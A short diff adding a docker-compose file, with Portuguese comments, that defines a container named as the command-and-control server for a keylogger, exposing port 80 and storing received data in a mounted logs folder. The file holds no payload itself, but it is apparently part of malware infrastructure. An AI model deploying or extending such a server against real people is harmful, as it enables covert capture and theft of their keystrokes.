@@ -1,0 +1,12 @@
+version: '3.8'
+name: c2_do_keylogger
+services:
+  c2-server:
+    build: .
+    container_name: meu_c2_server
+    ports:
+      - "80:80"
+    volumes:
+      - ./dados:/app/logs
+      - ./app.py:/app/app.py  # Mapeia o arquivo do host para dentro do container
+    restart: always
